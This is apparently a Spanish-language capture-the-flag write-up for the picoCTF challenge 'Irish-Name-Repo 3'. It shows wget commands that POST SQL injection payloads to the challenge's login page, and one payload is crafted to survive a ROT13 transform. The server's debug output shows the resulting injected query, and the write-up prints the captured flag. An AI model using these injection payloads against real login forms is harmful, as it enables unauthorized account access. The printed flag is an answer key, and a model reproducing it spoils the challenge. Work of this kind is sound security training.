# Irish-Name-Repo 3

## Descripción
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
## Solución
- Se tiene que buscar la forma de usar wget y poner SQL injections para obtener un archivo .php que contiene la bandera.

```
┌──(kali㉿kali)-[~]
└─$ wget https://jupiter.challenges.picoctf.org/problem/40742/login.php --post-data="debug=1&password=' or '1'='1"
--2022-09-28 22:01:55--  https://jupiter.challenges.picoctf.org/problem/40742/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 500 Internal Server Error
2022-09-28 22:01:56 ERROR 500: Internal Server Error.

                                                                                                  
┌──(kali㉿kali)-[~]
└─$ wget https://jupiter.challenges.picoctf.org/problem/40742/login.php --post-data="debug=1&password=abc"        
--2022-09-28 22:02:30--  https://jupiter.challenges.picoctf.org/problem/40742/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘login.php’

login.php                    [ <=>                             ]     101  --.-KB/s    in 0s      

2022-09-28 22:02:33 (25.8 MB/s) - ‘login.php’ saved [101]

                                                                                                  
┌──(kali㉿kali)-[~]
└─$ wget https://jupiter.challenges.picoctf.org/problem/40742/login.php --post-data="debug=1&password=a' or'1'='1"
--2022-09-28 22:03:28--  https://jupiter.challenges.picoctf.org/problem/40742/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 500 Internal Server Error
2022-09-28 22:03:28 ERROR 500: Internal Server Error.

                                                                                                  
┌──(kali㉿kali)-[~]
└─$ wget https://jupiter.challenges.picoctf.org/problem/40742/login.php --post-data="debug=1&password=a'be'1'='1"    
--2022-09-28 22:04:27--  https://jupiter.challenges.picoctf.org/problem/40742/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘login.php.1’

login.php.1                  [ <=>                             ]     164  --.-KB/s    in 0s      

2022-09-28 22:04:28 (26.2 MB/s) - ‘login.php.1’ saved [164]

                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat login.php               
<pre>password: abc
SQL query: SELECT * FROM admin where password = 'nop'
</pre><h1>Login failed.</h1>                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat login.php.1
<pre>password: a'be'1'='1
SQL query: SELECT * FROM admin where password = 'n'or'1'='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>                                                                                                  
┌──(kali㉿kali)-[~]
└─$ 

```

picoCTF{3v3n_m0r3_SQL_4424e7af}